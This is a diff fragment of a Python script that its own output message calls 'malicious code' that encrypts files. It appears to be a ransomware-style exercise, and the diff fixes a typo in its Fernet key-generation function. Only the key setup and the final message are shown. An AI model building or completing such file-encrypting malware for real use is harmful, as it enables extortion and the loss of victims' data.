@@ -5,7 +5,7 @@ import os
 #1. Gerar uma chave criptográfica e salvar
 
 def gerar_chave():
-    chave - Fernet.generate_key()
+    chave = Fernet.generate_key()
     with open("chave.key", "wb") as chave_file:
         chave_file.write(chave)
 
@@ -55,4 +55,5 @@ def main():
     print("código malicoisa executado! Arquivos criptografados!")
 
 if __name__=="__main__":
+
     main()
